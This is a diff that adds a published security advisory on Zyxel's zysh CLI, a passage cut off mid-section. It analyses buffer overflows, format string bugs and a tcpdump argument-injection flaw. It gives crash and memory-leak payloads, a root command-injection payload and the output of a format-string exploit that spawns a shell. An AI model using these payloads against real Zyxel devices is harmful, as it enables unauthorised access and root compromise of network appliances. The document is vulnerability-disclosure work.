@@ -1,1 +1,925 @@
-Advisory due for publication on 2022-06-07
+--[ HNS-2022-02 - HN Security Advisory - https://security.humanativaspa.it/
+
+* Title: Multiple vulnerabilities in Zyxel zysh
+* Products: Zyxel firewalls, AP controllers, and APs
+* Author: Marco Ivaldi <marco.ivaldi@hnsecurity.it>
+* Date: 2022-06-07
+* CVE Names and Vendor CVSS Scores:
+  CVE-2022-26531: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:H (6.1)
+  CVE-2022-26532: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (7.8)
+* Advisory URLs:
+  https://github.com/hnsecurity/vulns/blob/main/HNS-2022-02-zyxel-zysh.txt
+  https://www.zyxel.com/support/multiple-vulnerabilities-of-firewalls-AP-controllers-and-APs.shtml
+
+
+--[ 0 - Table of contents
+
+1 - Summary
+2 - Background
+3 - Vulnerabilities
+4 - Analysis
+    4.1 - Buffer overflows in the "configure terminal > diagnostic" command
+    4.2 - Buffer overflow in the "debug" command
+    4.3 - Buffer overflow in the "ssh" command
+    4.4 - Format string bugs in the "extension" argument of some commands
+    4.5 - OS command injection in the "packet-trace" command
+5 - Exploitation
+    5.1 - Buffer overflows
+    5.2 - Format string bugs
+    5.3 - OS command injection
+6 - Affected products
+7 - Remediation
+8 - Disclosure timeline
+9 - References
+
+
+--[ 1 - Summary
+
+"We live on a placid island of ignorance in the midst of black seas of
+infinity, and it was not meant that we should voyage far."
+                               -- H. P. Lovecraft, The Call of Cthulhu
+
+We have identified multiple security vulnerabilities in the zysh binary
+that implements the command-line interface (CLI) on a wide range of Zyxel
+products, including their security appliances such as those in the Unified
+Security Gateway (USG) product line:
+
+* Multiple stack-based buffer overflows in the code responsible for
+  handling diagnostic tests ("configure terminal > diagnostic" command).
+* A stack-based buffer overflow in the "debug" command.
+* A stack-based buffer overflow in the "ssh" command.
+* Multiple format string bugs in the "extension" argument of the "ping",
+  "ping6", "traceroute", "traceroute6", "nslookup", and "nslookup6"
+  commands.
+* An OS command injection vulnerability in the "packet-trace" command.
+
+We demonstrated the possibility to exploit the format string bugs and the
+OS command injection vulnerability to escape the restricted shell
+environment and achieve arbitrary command execution on the underlying
+embedded Linux OS, respectively as regular user and as root.
+
+
+--[ 2 - Background
+
+The zysh binary is a restricted shell that implements the command-line
+interface (CLI) on multiple Zyxel [0] products. All regular user accounts
+have an /etc/passwd entry similar to the following:
+
+admin:x:10007:10000:Administration account...:/etc/zyxel/ftp:/bin/zysh
+
+Only the root user and the reserved debug account, disabled by default,
+have access to a proper bash shell:
+
+root:x:0:0:root&admin&120&120&480&480&1&0:/root:/bin/bash
+...
+debug:!:0:0:Debug Account:/root:/bin/bash
+
+The Zyxel CLI can be accessed via SSH as follows:
+
+raptor@blumenkraft ~ % ssh <REDACTED> -l admin
+(admin@<REDACTED>) Password:
+Router> # hello zysh!
+
+On our Zyxel USG20-VPN test device, the CLI can also be accessed via Telnet
+(not enabled by default) or via the so-called Web Console, implemented with
+WebSockets, that is reachable with a web browser after authentication, at a
+URL such as the following:
+
+https://<REDACTED>/webconsole/
+
+In the context of a wider audit of the security posture of Zyxel devices
+[1], we decided to audit zysh with the primary goal of escaping the
+restricted shell environment and executing arbitrary commands on the
+underlying embedded Linux OS. It is pretty large for a dynamically-linked,
+stripped binary (~19MB) and it makes plenty of unsafe API function calls,
+which makes it an interesting target.
+
+
+--[ 3 - Vulnerabilities
+
+During our audit of the zysh binary, we identified the following
+vulnerabilities:
+
+* Multiple stack-based buffer overflows in the code responsible for
+  handling diagnostic tests ("configure terminal > diagnostic" command).
+* A stack-based buffer overflow in the "debug" command.
+* A stack-based buffer overflow in the "ssh" command.
+* Multiple format string bugs in the "extension" argument of the "ping",
+  "ping6", "traceroute", "traceroute6", "nslookup", and "nslookup6"
+  commands.
+* An OS command injection vulnerability in the "packet-trace" command.
+
+All buffer overflows can be triggered only by admin users, while the format
+string bugs and the command injection vulnerability are exploitable by
+authenticated users of either admin or limited-admin type.
+
+
+--[ 4 - Analysis
+
+To follow along with our detailed vulnerability analysis, you can download
+the Zyxel Firmware 5.10 for "USG20-VPN - ABAQ - Non-Wireless Edition"
+(USG20-VPN_5.10.zip [2]). Extract the ZIP archive, then extract the
+password-protected ZIP archive 510ABAQ0C0.bin contained within, using the
+following password [1]:
+
+4ulPPIs94jnYwUfwwoTqz/a5eRHFRwNYq8zFTrQZaE7XkoTgdzWc.6jea1v1zJb 
+
+Finally, extract the Squashfs filesystem image with binwalk or a similar
+tool, e.g.:
+
+raptor@blumenkraft 510ABAQ0C0 % binwalk -e compress.img
+
+The target binary we will reference throughout our analysys is /bin/zysh,
+available in the extracted filesystem:
+
+raptor@blumenkraft bin % ls -l zysh
+-rwxr-xr-x  1 raptor  staff  19727292 Sep 23 18:33 zysh*
+raptor@blumenkraft bin % shasum -a 256 zysh
+47ee711a817e33bb2809e91d76b512498ae3cdca1276a2385f404384547404e3  zysh
+raptor@blumenkraft bin % file zysh
+zysh: ELF 32-bit MSB executable, MIPS, N32 MIPS64 rel2 version 1 (SYSV),
+dynamically linked, interpreter /lib32/ld.so.1, for GNU/Linux 2.6.9,
+stripped
+
+You can easily import it in your favorite disassembler. In Ghidra, we had
+to manually tweak the import options to reflect that the binary was
+compiled for the N32 ABI [3], importing it as "MIPS:BE:64:64-32addr:n32".
+The same requirement holds for any other binaries compiled for the Cavium
+Octeon III processor, on which our Zyxel USG20-VPN test device is based.
+
+
+--[ 4.1 - Buffer overflows in the "configure terminal > diagnostic" command
+
+The first buffer overflow vulnerability we identified is located in the
+function at 0x1013b238, which we dubbed do_emtap():
+
+undefined8 do_emtap(longlong argc, char **argv)
+{
+...
+  char acStack305[129];
+...
+  else {
+    uVar1 = 1;
+    if (argc == 3) {
+      sprintf(acStack305 + 1, "t%s.sh", argv[2]); /* VULN #1 */
+      pcVar4 = argv[1];
+      do_emtap_test(pcVar4, acStack305 + 1);
+      do_emtap_test2(pcVar4, acStack305 + 1);
+      report_test();
+      uVar1 = 0;
+    }
+  }
+  return uVar1;
+}
+
+This function is called when an admin user invokes the diagnostic test
+functionality in the Zyxel CLI with two arguments, e.g.:
+
+Router> configure terminal
+Router(config)# diagnostic test <test_name> <test_num>
+
+The buffer overflow happens due to the unsafe sprintf() call marked with
+the "VULN #1" comment above, which overflows past the boundary of the
+acStack305 array allocated on the stack with the contents of the <test_num>
+argument.
+
+Upon exploitation, however, the return statement at 0x1013b2f4 is never
+reached, because the overflow propagates to the other functions that are
+called by do_emtap(), which we dubbed do_emtap_test() and do_emtap_test2()
+in the pseudo-code above. More precisely, another overflow happens at the
+sprintf() call below marked as "VULN #2", located in the do_emtap_test()
+function at 0x1013a8f8. This overflow enables us to gain control over the
+pc register when do_emtap_test() returns:
+
+int do_emtap_test(char *test_name, char *test_num)
+{
+...
+  char acStack320[128];
+  char acStack192[128];
+...
+  sprintf(acStack320, "%s/%s", "/tmp/tap", test_name); /* VULN #3 */
+  mkdir(acStack320, 0x1c0);
+  sprintf(acStack192, "%s/%s/%s", "/usr/local/emtap/test_script",
+          test_name, test_num); /* VULN #2 */
+  iVar1 = access(acStack192, 0);
+  if (iVar1 != 0) {
+    return 1;
+  }
+...
+}
+
+The unsafe sprintf() call overflows past the boundary of the acStack192
+array. When do_emtap_test() returns, we are able hijack the control flow.
+However, we can only use numeric characters in our hostile buffer,
+therefore exploitation is extremely unlikely, if at all possible. The
+overflow can be triggered with the following payload:
+
+Router> configure terminal
+Router(config)# diagnostic test anything 1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
+Program received signal SIGBUS, Bus error.
+0x31313130 in ?? ()
+
+A slightly better opportunity for exploitation is represented by another
+stack-based buffer overflow in the above function, marked with the "VULN
+#3" comment. This specific overflow can be triggered with the following
+payload:
+
+Router> configure terminal
+Router(config)# diagnostic test AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 1
+Program received signal SIGBUS, Bus error.
+0x41414140 in ?? ()
+
+This time, our hostile buffer can contain alphanumeric characters in the
+range [a-zA-Z0-9], plus the underscore '_'. Still far from ideal, but
+definitely better than the previously identified exploitation vector.  
+
+A similar vector is provided by yet another stack-based buffer overflow,
+this time in the function located at 0x1013ada0, which we dubbed
+do_emtap_test3():
+
+undefined8 do_emtap_test3(char *test_name)
+{
+...
+  char acStack288[127];
+...
+  sprintf(acStack288, "%s %s/%s | %s -E \'t[0-9]+\\.sh\' > %s", "/bin/ls",
+	  "/usr/local/emtap/test_script", test_name, "/bin/grep",
+          "/tmp/tap/test_case_dir.tmp"); /* VULN #4 */
+  system(acStack288);
+...
+    sprintf(acStack288, "%s %s", "/bin/rm", "/tmp/tap/test_case_dir.tmp");
+    system(acStack288);
+    return 0;
+  }
+...
+}
+
+This function is called when an admin user invokes the diagnostic test
+functionality in the Zyxel CLI with only one argument, e.g.:
+
+Router> configure terminal
+Router(config)# diagnostic test <test_name>
+
+This time, the unsafe sprintf() call marked with the "VULN #4" comment
+overflows past the boundary of the acStack288 array. By exploiting this
+overflow, we can once again overwrite the pc register and hijack the
+control flow. In order to trigger this overflow, the following payload can
+be used:
+
+Router> configure terminal
+Router(config)# diagnostic test AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+/bin/ls: cannot access /usr/local/emtap/test_script/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA: No such file or directory
+Program received signal SIGBUS, Bus error.
+0x41414140 in ?? ()
+
+In the mentioned functions, including the one located at 0x1013aa10 that we
+dubbed do_emtap_test2() and that is not immediately reachable via the
+codepaths triggered by our hostile inputs, there are other instances of
+buffer overflow caused by the unchecked use of unsafe API functions, such
+as sprintf() and strcpy(). We have not deeply investigated their actual
+reachability, but they should be fixed as well. In addition, many unsafe
+programming constructs are present in the rest of the binary.
+
+
+--[ 4.2 - Buffer overflow in the "debug" command
+
+The buffer overflow vulnerability we identified in the code responsible for
+handling the "debug" command is located in the function at 0x1000df70,
+which we dubbed do_debug().
+
+It is a pretty long function that gets called when an admin (or in some
+cases a limited-admin) user invokes the debug functionality in the Zyxel
+CLI, e.g.:
+
+Router> debug <argument list>
+
+To trigger the overflow, the following payload can be used:
+
+Router> debug gui webhelp redirect AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Router> debug gui show webhelp redirect
+Program received signal SIGBUS, Bus error.
+0x41414140 in ?? ()
+
+The first command writes a long string in the /tmp/webhelppath file:
+
+int do_debug(ulonglong argc, char **argv)
+{
+...
+  case 0x155:
+    if (DAT_1145e55c != 0x150) {
+      return 0;
+    }
+    pcVar11 = "/tmp/webhelppath";
+    if (DAT_1145e564 != 0x154) {
+      return 0;
+    }
+LAB_1000ebdc:
+    pFVar12 = fopen64(pcVar11, "w"); /* open file */
+...
+    fputs(argv[4], pFVar12); /* write string to file */
+    fclose(pFVar12);
+    return 0;
+}
+
+The second command triggers the overflow by reading from the
+/tmp/webhelppath file:
+
+int do_debug(ulonglong argc, char **argv)
+{
+...
+  undefined8 local_e0;
+...
+    if (lVar24 == 0x155) {
+      pFVar12 = fopen64("/tmp/webhelppath", "r");
+...
+	__isoc99_fscanf(pFVar12, "%s", &local_e0); /* VULN #5 */
+        fclose(pFVar12);
+        fwrite(&DAT_1013fe18, 1, 9, stdout);
+        puVar22 = &local_e0;
+        pcVar11 = "Webhelp redirect: %s\n";
+      }
+LAB_1000f7d0:
+      fprintf(stdout, pcVar11, puVar22);
+      fwrite(&DAT_1013fe48, 1, 2, stdout);
+      return 0;
+    }
+
+The vulnerability lies in the use of the unsafe __isoc99_fscanf() API
+function, which does not check if the destination string is large enough to
+accommodate the whole source string. This allows us to overwrite the saved
+return address and hijack the control flow. Our hostile buffer is limited
+to a length of 255 bytes and can contain only alphanumeric characters in
+the range [a-zA-Z0-9], plus the underscore '_', dash '-', and dot '.'
+special characters.
+
+A similar bug can be triggered with the "debug gui kb redirect" and "debug
+gui show kb redirect" command combination. However, in this case, the
+destination buffer is too far away from the location where the return
+address is saved on the stack, therefore we cannot exploit this bug to
+control the pc register. We do not exclude other ways to exploit this
+vulnerability.
+
+
+--[ 4.3 - Buffer overflow in the "ssh" command
+
+The buffer overflow vulnerability we identified in the code responsible for
+handling the "ssh" command is located in the function at 0x10012298, which
+we dubbed do_ssh():
+
+undefined8 do_ssh(int argc, char **argv)
+{
+...
+  char acStack336[300];
+...
+  sprintf(acStack336, "/usr/bin/ssh -o UserKnownHostsFile=/dev/null %s",
+    argv[1]); /* VULN #5 */
+...
+    sVar4 = strlen(acStack336);
+    sprintf(acStack336 + sVar4, " -p %s", *(undefined4 *)((int)argv +
+        iVar2)); /* VULN #6 */
+...
+}
+
+You know the gist by now: there are two stack-based buffer overflows caused
+by the unchecked use of the unsafe API function sprintf(). To trigger the
+first overflow the following payload can be used, as an authenticated admin
+or limited-admin user:
+
+Router> ssh AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@127.0.0.1
+The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.
+RSA key fingerprint is SHA256:fzNloEaOsmNQLHbhjroUVHkJC9ZTH09A6TRjyK+oiys.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '127.0.0.1' (RSA) to the list of known hosts.
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@127.0.0.1's password:
+[press enter a few times]
+Program received signal SIGBUS, Bus error.
+0x41414140 in ?? ()
+
+Once again, our hostile buffer can contain only alphanumeric characters,
+plus some special characters. As a side note, we noticed that we can inject
+arguments that get passed to the underlying /usr/bin/ssh command, albeit
+with some limitations:
+
+Router> ssh -@127.0.0.1
+unknown option -- @
+usage: ssh [-46AaCfGgKkMNnqsTtVvXxYy] [-B bind_interface]
+           [-b bind_address] [-c cipher_spec] [-D [bind_address:]port]
+           [-E log_file] [-e escape_char] [-F configfile] [-I pkcs11]
+           [-i identity_file] [-J [user@]host[:port]] [-L address]
+           [-l login_name] [-m mac_spec] [-O ctl_cmd] [-o option] [-p port]
+           [-Q query_option] [-R address] [-S ctl_path] [-W host:port]
+           [-w local_tun[:remote_tun]] destination [command]
+
+Based on our analysis, this lack of input filtering is not exploitable to
+inject interesting command-line arguments (e.g. "-o ProxyCommand=..."):
+
+Router> ssh -oProxyCommand@127.0.0.1
+command-line: line 0: Bad configuration option: proxycommand@127.0.0.1
+Router> ssh -oProxyCommand=@127.0.0.1
+% (after 'ssh'): Parse error
+retval = -1
+ERROR: Parse error/command not found!
+
+--[ 4.4 - Format string bugs in the "extension" argument of some commands
+
+Some zysh commands implement a special "extension" argument that allows to
+specify arbitrary command-line arguments to be passed to the invoked OS
+command that underlies each functionality:
+
+Router> ping 127.0.0.1
+;
+<cr>
+count
+extension
+forever
+interface
+size
+source
+|
+
+For instance, if we enter the following zysh command:
+
+Router> ping 127.0.0.1 extension -c 1
+
+The OS command line below will be executed via the function located at
+0x101295d0, which we dubbed my_invoke():
+
+$ /bin/zysudo.suid /bin/ping 1.1.1.1 -n -c 3  -c 1
+
+As you can see, the additional arguments we specified after the "extension"
+keyword are appended to the OS command line.
+
+We identified format string bugs in the following zysh commands:
+
+* "ping" and "ping6" commands, handled by the function at 0x1000c0a0, which
+  we dubbed do_ping().
+* "traceroute" and "traceroute6" commands, handled by the function at
+  0x1000bc58, which we dubbed do_traceroute().
+* "nslookup" and "nslookup6" commands, handled by the function at
+  0x1000c718, which we dubbed do_nslookup().
+
+The relevant pseudo-code snippets are:
+
+undefined8 do_ping(int argc, char **argv, char *cmd)
+{
+...
+  if (iVar9 != 0) {
+    sVar5 = strlen(acStack880);
+    pcVar1 = ppcStack96[iVar9 + 1];
+    acStack880[sVar5] = ' ';
+    acStack880[sVar5 + 1] = '\0';
+    strcpy(acStack880 + sVar5 + 1, pcVar1); /* append extension args */
+  }
+  if (iVar8 == 0) {
+    sprintf(acStack4976, acStack880); /* VULN: format string bug */
+    __pid = fork();
+...
+}
+
+undefined8 do_traceroute(int argc, char **argv, char *cmd)
+{
+...
+  if (iVar10 != 0) {
+    sVar6 = strlen(acStack864);
+    pcVar2 = argv[iVar10 + 1];
+    acStack864[sVar6] = ' ';
+    acStack864[sVar6 + 1] = '\0';
+    strcpy(acStack864 + sVar6 + 1, pcVar2); /* append extension args */
+  }
+...
+LAB_1000be10:
+  sprintf(acStack4960,acStack864); /* VULN: format string bug */
+  __pid = fork();
+...
+}
+
+undefined8 do_nslookup(int argc, char **argv)
+{
+...
+  pcVar4 = stpcpy((char *)((int)&uStack832 + sVar3 + 1), 
+      *(char **)((int)argv + iVar2));
+  if (iVar8 != 0) {
+    pcVar4[1] = '\0';
+    *pcVar4 = ' ';
+    strcpy(pcVar4 + 1, argv[iVar8 + 1]); /* append extension args */
+  }
+...
+  sprintf(acStack4928, (char *)&uStack832); /* VULN: format string bug */
+  __pid = fork();
+...
+}
+
+As a side note, in the "nslookup" and "nslookup6" commands there is also a
+bonus stack-based buffer overflow that is not large enough to reach the
+saved return address. It can be reproduced with the following payload:
+
+Router> nslookup AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA server AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA extension AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Program received signal SIGBUS, Bus error.
+0x1000ba10 in _ftext ()
+(gdb) x/i $pc
+=> 0x1000ba10 <_ftext+17776>: lw  v1,-10184(s0)
+(gdb) i r s0
+s0: 0x4141414141414141
+
+To reproduce the format string bugs and leak stack memory contents or crash
+zysh, instead, the following payloads can be used:
+
+Router> # stack memory leak
+Router> ping 127.0.0.1 extension %x%x%x%x
+ping: unknown host 6eb83a7580808080fefeff001145e560
+Router> # crash
+Router> ping 127.0.0.1 extension %n%n%n%n
+Program received signal SIGSEGV, Segmentation fault.
+0x77bf6768 in vfprintf () from /lib32/libc.so.6
+(gdb) bt
+#0  0x77bf6768 in vfprintf () from /lib32/libc.so.6
+#1  0x77c14f44 in vsprintf () from /lib32/libc.so.6
+#2  0x77bfd980 in sprintf () from /lib32/libc.so.6
+#3  0x1000c38c in _ftext () << do_ping()
+...
+Router> # crash
+Router> ping6 ::1 extension %n%n%n%n
+Program received signal SIGSEGV, Segmentation fault.
+0x77bf6768 in vfprintf () from /lib32/libc.so.6
+
+Router> # crash
+Router> traceroute 127.0.0.1 extension %n%n%n%n
+Program received signal SIGSEGV, Segmentation fault.
+0x77bf6768 in vfprintf () from /lib32/libc.so.6
+(gdb) bt
+#0  0x77bf6768 in vfprintf () from /lib32/libc.so.6
+#1  0x77c14f44 in vsprintf () from /lib32/libc.so.6
+#2  0x77bfd980 in sprintf () from /lib32/libc.so.6
+#3  0x1000be18 in _ftext () << do_traceroute()
+...
+Router> # crash
+Router> traceroute6 ::1 extension %n%n%n%n
+Program received signal SIGSEGV, Segmentation fault.
+0x77bf6768 in vfprintf () from /lib32/libc.so.6
+
+Router> # stack memory leak
+Router> nslookup 127.0.0.1 extension %x%x%x%x
+Using domain server:
+Name: 127.0.0.1
+Address: 127.0.0.1#53
+Aliases:
+
+Host 0bd01390 not found: 3(NXDOMAIN)
+Router> # crash
+Router> nslookup 127.0.0.1 extension %n%n%n%n
+
+Program received signal SIGSEGV, Segmentation fault.
+0x77bf6768 in vfprintf () from /lib32/libc.so.6
+(gdb) bt
+#0  0x77bf6768 in vfprintf () from /lib32/libc.so.6
+#1  0x77c14f44 in vsprintf () from /lib32/libc.so.6
+#2  0x77bfd980 in sprintf () from /lib32/libc.so.6
+#3  0x1000c8c0 in _ftext () << do_nslookup()
+...
+Router> # crash
+Router> nslookup6 ::1 extension %n%n%n%n
+Program received signal SIGSEGV, Segmentation fault.
+0x77bf6768 in vfprintf () from /lib32/libc.so.6
+
+We just confirmed that we control the format strings passed as argument to
+the sprintf() API function in different locations of our target binary.
+
+
+--[ 4.5 - OS command injection in the "packet-trace" command
+
+The OS command injection we identified in the code responsible for handling
+the "packet-trace" command is located in the function at 0x10010258, which
+we dubbed do_packet-trace().
+
+This function builds the command line for the /usr/sbin/tcpdump binary,
+based on the arguments with which the "packet-trace" command is invoked.
+The available arguments are:
+
+Router# packet-trace
+;
+<cr>
+dst-host
+duration
+extension-filter
+file
+interface
+ip-proto
+ipv6-proto
+port
+src-host
+|
+
+The "extension-filter" argument is particularly interesting, because it
+allows to specify additional arbitrary command-line arguments to be passed
+to tcpdump. For instance, if we enter the following zysh command:
+
+Router# packet-trace extension-filter -ln -i lo -w -a -W 1 -G 1 -z id
+
+The OS command line below will be executed via the function located at
+0x101295d0, which we dubbed my_invoke():
+
+$ /usr/sbin/tcpdump -n -i eth0 -ln -i lo -w -a -W 1 -G 1 -z id
+
+As you can see, we are using a variation of a well-known GTFOBins payload
+[4] that allows us to execute the following OS command (yes, command-line
+switches that begin with a '-' are accepted):
+
+$ id -a
+
+Refer to the manual page of tcpdump [5] for further details on how each
+command-line switch is interpreted. Seeing it all in action from the Web
+Console, as an authenticated admin or limited-admin user:
+
+Router# packet-trace extension-filter -ln -i lo -w -a -W 1 -G 1 -z id
+tcpdump: listening on lo, link-type EN10MB (Ethernet), snapshot length 65535 bytes
+Maximum file limit reached: 1
+1 packet captured
+2 packets received by filter
+0 packets dropped by kernel
+uid=0(root) gid=0(root) groups=0(root)
+
+We got arbitrary command execution as root! We just need to find a way to
+exploit it to escape the restricted shell environment.
+
+
+--[ 5 - Exploitation
+
+In the following sections, we will discuss exploitation of the identified
+vulnerabilities.
+
+
+--[ 5.1 - Buffer overflows
+
+The zysh binary is in a sorry state when it comes to modern countermeasures
+against exploitation of memory corruption bugs:
+
+* No RELRO
+* No stack canary
+* NX disabled
+* No PIE
+* Has RWX segments
+
+That said, it looks like the buffer overflow vulnerabilities described in
+this advisory cannot be exploited to achieve arbitrary code execution after
+all, despite our gut feeling... In summary:
+
+* MIPS alphanumeric shellcode is not a thing [6]. 
+* A pure ROP chain is also not feasible, at least with the memory mapping
+  used by the device and firmware version combination that we could test.
+
+We can solve the first problem by storing our shellcode (along with a
+copious number of NOP-equivalent opcodes) in the value of the TERM
+environment variable that gets passed to the remote system via sshd (or
+in.telnetd). At this point, we still need to be able to overwrite the
+stored return address with a value that points to our NOP sled and
+shellcode payload, though. Unfortunately, a partial overwrite would not
+work in this case, because our target architecture is big endian and
+therefore we would only be able to overwrite the most significant byte(s),
+achieving nothing of note. On a device and firmware combination with a
+slightly different memory mapping, however, we might be able to pull this
+off and hijack the control flow.
+
+We are not well-versed in the fine and obscure art of MIPS shellcoding and
+exploitation, so we might have missed something. Feel free to try this
+challenge on your own!
+
+As a final note, we also looked into the possibility to exploit the many
+unsafe calls to system() present in the code in order to inject arbitrary
+OS commands. However, we could not slip past the pretty aggressive input
+filters implemented by zysh. Too bad.
+
+
+--[ 5.2 - Format string bugs
+
+As discussed earlier, we control the format strings passed as argument to
+the sprintf() API function in different locations of our target binary. As
+a proof of concept, this allowed us to leak stack memory contents and crash
+zysh.
+
+It is now time to see if we are able to exploit the identified format
+string bugs to execute arbitrary code and escape the restricted shell
+environment... At first glance, this does not look feasible, because once
+again we are limited in the characters that we can use in our hostile
+buffer (alphanumeric characters plus some special characters in the 7-bit
+ASCII set). 
+
+However, we devised a workaround: instead of placing our retloc addresses
+at the beginning of the hostile format string as is customary, we can
+inject them in the process memory via the TERM environment variable! The
+direct parameter access feature of glibc, together with our very own format
+string exploitation technique for RISC architectures [7], will do the rest.
+
+Long story short, we put together a proof-of-concept exploit [8] that does
+the following:
+
+* Authenticate and access the target zysh via SSH, injecting our payload
+  (retloc sled + NOP sled + shellcode + padding) via the TERM environment
+  variable.
+
+* Leak a stack address via the format string bug in the "ping" command, and
+  use it to calculate the address of our injected shellcode near the bottom
+  of the stack, which changes slightly at each zysh execution.
+
+* Craft another hostile format string to use as an argument to the "ping"
+  command and overwrite the .got entry of fork(), which gets called right
+  after the vulnerable sprintf(), with the shellcode address, using a
+  variation of our write-one-byte-at-a-time technique designed for RISC
+  architectures such as MIPS and SPARC.
+
+* Interact with the spawned bash shell!
+
+We initially thought that Python/Paramiko would be a good language choice
+for the implementation, but we quickly changed our mind. In the end, we
+decided to go full old-school and developed our exploit in Tcl/Expect.
+Here it is in action:
+
+raptor@blumenkraft ~ % ./raptor_zysh_fhtagn.exp <REDACTED> admin password
+raptor_zysh_fhtagn.exp - zysh format string PoC exploit
+Copyright (c) 2022 Marco Ivaldi <raptor@0xdeadbeef.info>
+
+Leaked stack address:	0x7fe97170
+Shellcode address:	0x7fe9de40
+Base string length:	46
+Hostile format string:	%.18u%1801$n%.169u%1801$hn%.150u%1801$hhn%.95u%1802$hhn
+
+*** enjoy your shell! ***
+
+sh-5.1$ uname -snrmp
+Linux USG20-VPN 3.10.87-rt80-Cavium-Octeon mips64 Cavium Octeon III V0.2 FPU V0.0
+sh-5.1$ id
+uid=10007(admin) gid=10000(operator) groups=10000(operator)
+
+Once we have access to a bash shell on the underlying embedded Linux OS, it
+should be pretty easy to escalate privileges to root, by leveraging local
+vulnerabilities [1]. 
+
+It should not be too hard to automate/weaponize our exploit to make it work
+against other targets. This is left as an exercise.
+
+In conclusion, format string bugs are a powerful exploit primitive, one of
+our favorites. Once again, they proved to be up to the task even in a
+constrained scenario such as the one we described.
+
+
+--[ 5.3 - OS command injection
+
+We managed to find a way to execute arbitrary OS commands by injecting
+specially-crafted arguments into the tcpdump command line. However,
+exploitation of this vulnerability to escape the restricted shell
+environment is not straightforward, due to a number of constraints:
+
+* We can only execute OS commands that do something useful to reach our
